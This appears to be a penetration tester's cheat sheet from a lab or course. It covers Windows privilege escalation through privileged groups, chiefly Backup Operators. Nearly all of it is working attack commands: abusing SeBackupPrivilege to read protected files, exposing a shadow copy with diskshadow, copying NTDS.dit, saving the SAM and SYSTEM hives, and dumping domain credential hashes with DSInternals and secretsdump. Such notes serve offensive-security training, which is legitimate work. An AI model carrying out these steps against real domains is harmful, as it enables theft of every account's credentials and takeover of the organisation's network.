All built-in Windows groups: https://ss64.com/nt/syntax-security_groups.html
Detailed list of privileged accounts and groups in Active Directory: https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory
Groups of Interest:
- Backup Operators
- Hyper-V Administrators
- Event Log Readers
- Print Operators
- DnsAdmins
- Server Operators

**Check Groups
```
whoami /groups
```

## Backup Operators
https://github.com/giuliano108/SeBackupPrivilege

**Importing Libraries
```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

**Verifying SeBackupPrivilege is Enabled
```
whoami /priv
Get-SeBackupPrivilege
```

**Enabling SeBackupPrivilege
```
Set-SeBackupPrivilege
Get-SeBackupPrivilege
whoami /priv
```

**Copying a Protected File
```
dir C:\Confidential\
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
cat .\Contract.txt
```
- This shows how sensitive information was accessed without possessing the required permissions

**Attacking a Domain Controller - Copying NTDS.dit
```
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
dir E:
```

**Copying NTDS.dit Locally
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

**Backing up SAM and SYSTEM Registry Hives
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
- Can use secretsdump.py or PowerShell DSInternals to extract credentials

**Extracting Credentials from NTDS.dit
```
Import-Module .\DSInterals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

**Extracting Hashes Using SecretsDump
```
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

## Robocopy

**Copying Files with Robocopy
```
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```
